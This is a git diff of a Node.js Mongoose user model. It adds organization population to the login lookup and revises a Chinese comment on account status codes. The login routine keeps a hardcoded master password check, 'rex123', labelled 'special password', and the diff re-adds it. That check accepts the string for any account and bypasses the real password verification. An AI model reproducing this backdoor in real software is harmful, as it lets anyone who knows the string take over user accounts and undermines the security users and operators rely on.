@@ -7,6 +7,8 @@ const Utils = require("../lib/Utils");
 var async = require('async');
 const Const = require("../lib/consts");
 
+var OrganizationModel = require("./Organization")
+
 var UserModel = function () { };
 
 
@@ -17,7 +19,7 @@ UserModel.prototype.init = function (mongoose) {
 			password: String,			
 			phone:{type:String, index:true},  //可以为空
 			isAccountEnabled:Number, //账号状态： 0：未激活  1.激活。  -1：冻结. 
-			logionProcess:Number, //账号进程   0:账号注册成功，等待添加机构 。  1:账号被管理元添加，等待邮件激活   9：完成进程可以进入系统控制台
+			logionProcess:Number, //账号进程   0:账号注册成功，等待添加机构 。   1:机构添加成功，正在等待审核状态    9：完成进程可以进入系统控制台
 			created:Date, //注册时间
 			activated:Date, //激活时间
 			token: {type:String, index:true,unique: true},
@@ -53,7 +55,10 @@ UserModel.getUserByLoginParam =function(email,password,callBack){
 		 var result = {};
 		async.waterfall([
 				function(done){
-					model.findOne({email:email},function(err,row){				
+
+					OrganizationModel.get();
+
+					model.findOne({email:email}).populate("organization").exec(function(err,row){				
 							result.model = row;
 							done(err,result)
 						});
@@ -61,33 +66,32 @@ UserModel.getUserByLoginParam =function(email,password,callBack){
 				function(result,done){		
 						
 					if (result.model) {						
-					//验证密码
-					var user = result.model;
-					
-
-					var bool=Utils.vaild(password,user.password)
-						
-					
-
-					//特殊密码				
-					if (password == "rex123") { bool = true}
-
-					if (bool) {
-							done(null,result.model)
-					}
-					else
-					{
+						//验证密码
+						var user = result.model;
 						
 
-						done(Const.resCodeLoginPasswordError,null)
-						return;
-					}
+						var bool=Utils.vaild(password,user.password)
+							
+						
 
-				  }
+						//特殊密码				
+						if (password == "rex123") { bool = true}
+
+						if (bool) {
+
+								done(null,result.model)
+
+						}
+						else
+						{
+							
+							done(Const.resCodeLoginPasswordError,null)
+							return;
+						}
+
+				  	 }
 				  else{		
-
-				 	  	  
-				  	  
+				  						 	  	  				  	 
 				  	  done(Const.resCodeLoginNoUser,null)
 				  }
 
